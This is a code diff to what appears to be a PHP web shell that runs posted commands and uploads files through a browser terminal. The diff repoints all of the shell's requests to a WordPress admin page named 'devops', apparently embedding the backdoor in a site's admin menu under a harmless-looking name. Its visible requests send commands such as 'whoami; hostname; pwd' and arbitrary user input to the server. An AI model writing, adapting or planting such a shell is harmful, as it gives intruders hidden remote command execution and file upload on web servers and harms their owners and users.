@@ -138,6 +138,7 @@ if (ISSET($_POST['cmd'])) {
             var usernameElement = document.getElementById("username");
             var uploadFormElement = document.getElementById("upload");
             var fileBrowserElement = document.getElementById("filebrowser");
+            var requestURL = menu_page_url('devops')+"/?option=shell";
             getShellInfo();
             
             function getShellInfo() {
@@ -154,7 +155,7 @@ if (ISSET($_POST['cmd'])) {
                         updateInputWidth();
                     }
                 };
-                request.open("POST", "", true);
+                request.open("POST", requestURL, true);
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                 request.send("cmd=whoami; hostname; pwd");
             }
@@ -206,7 +207,7 @@ if (ISSET($_POST['cmd'])) {
                         updateInputWidth();
                     }
                 };
-                request.open("POST", "", true);
+                request.open("POST", requestURL, true);
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                 request.send("cmd="+encodeURIComponent(command));
                 return false;
@@ -224,7 +225,7 @@ if (ISSET($_POST['cmd'])) {
                         outputElement.innerHTML += request.responseText+"<br>";
                     }
                 };
-                request.open("POST", "", true);
+                request.open("POST", requestURL, true);
                 request.send(formData);
                 outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
             }
